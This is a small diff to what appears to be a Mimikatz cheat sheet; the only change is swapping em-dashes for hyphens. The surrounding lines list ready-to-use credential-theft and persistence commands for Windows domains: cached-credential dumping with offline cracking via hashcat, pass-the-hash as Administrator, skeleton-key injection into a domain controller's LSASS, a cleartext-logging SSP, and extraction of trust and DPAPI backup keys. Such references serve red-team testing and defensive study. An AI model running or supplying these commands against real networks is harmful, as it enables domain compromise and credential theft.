@@ -61,7 +61,7 @@ Service account passwords, cached domain credentials, auto-logon passwords.
 ```
 lsadump::cache
 ```
-DCC2 hashes — crackable offline with hashcat mode 2100.
+DCC2 hashes - crackable offline with hashcat mode 2100.
 
 ## Kerberos Attacks
 
@@ -148,7 +148,7 @@ sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH /run:cmd.exe
 ## Misc Useful
 
 ```
-misc::skeleton           # Skeleton key attack (T1556.001) — inject into DC LSASS
+misc::skeleton           # Skeleton key attack (T1556.001) - inject into DC LSASS
 misc::memssp             # Memory-resident SSP (logs cleartext to C:\Windows\System32\mimilsa.log)
 lsadump::trust           # Domain trust keys
 lsadump::backupkeys      # DPAPI backup keys from DC
